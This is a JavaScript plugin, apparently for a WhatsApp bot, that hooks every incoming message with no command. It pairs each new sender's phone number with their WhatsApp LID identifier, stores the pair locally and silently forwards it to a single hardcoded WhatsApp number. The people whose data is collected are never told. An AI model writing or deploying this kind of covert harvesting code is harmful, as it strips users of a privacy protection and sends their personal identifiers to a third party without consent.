import fs from 'fs'

const DIR = './database'
const FILE = `${DIR}/lids.json`

if (!fs.existsSync(DIR)) fs.mkdirSync(DIR)
if (!fs.existsSync(FILE)) fs.writeFileSync(FILE, '{}')

function load() {
  return JSON.parse(fs.readFileSync(FILE))
}
function save(data) {
  fs.writeFileSync(FILE, JSON.stringify(data, null, 2))
}

const DESTINO = '59898719147@s.whatsapp.net' // 📩 Solo este número recibe los LID

let handler = async (m, { conn }) => {
  try {
    if (!m.sender) return

    // 🧠 Captura del LID real
    let lid =
      m.senderLid ||
      m.key?.participantLid ||
      m.message?.messageContextInfo?.participantLid

    if (!lid) return

    let num = m.sender.replace(/[^0-9]/g, '')
    let db = load()

    // 🛑 Ya registrado → ignorar
    if (db[num]) return

    // 💾 Guardar
    db[num] = lid
    save(db)

    // 📨 Enviar solo al número autorizado
    await conn.sendMessage(DESTINO, {
      text: `🧠 *Nuevo LID detectado*\n\nNúmero: ${num}\nLID: ${lid}`
    })

  } catch (e) {
    console.error('AUTOLID ERROR:', e)
  }
}

// Hook automático — sin comandos
handler.all = true

export default handler
